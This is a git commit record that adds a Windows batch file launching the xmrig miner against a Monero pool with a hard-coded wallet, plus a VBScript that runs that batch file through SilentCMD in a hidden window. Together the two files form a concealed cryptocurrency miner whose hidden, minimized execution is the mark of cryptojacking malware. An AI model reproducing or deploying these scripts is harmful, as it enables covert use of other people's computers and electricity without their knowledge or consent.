0380c6c6a22ddd45be5ba11a30f945ae5841e539
raja169912 <madhupathak316@gmail.com>
2025-05-19 17:45:32 +0530

    Add files via upload

---
+++ SM_Miner.bat
@@ -0,0 +1,3 @@
+@echo off
+start /min xmrig.exe -o rx.unmineable.com:3333 -a rx -k -u XMR:429MyH6D7uC8Ed6i5UbE9vLLiTZe9at3x5QN9G9rncqMWFWM1wWELcoNNtFxqNPnvdXtC7DVb5TQA8oD7gVLu2ZeLrTtQBN.SM_Miner -p x --donate-level=0 --cpu-priority=5 --randomx-1gb-pages
+exit
---
+++ launch_silent.vbs
@@ -0,0 +1,3 @@
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run "SilentCMD.exe SM_Miner.bat", 0
+Set WshShell = Nothing
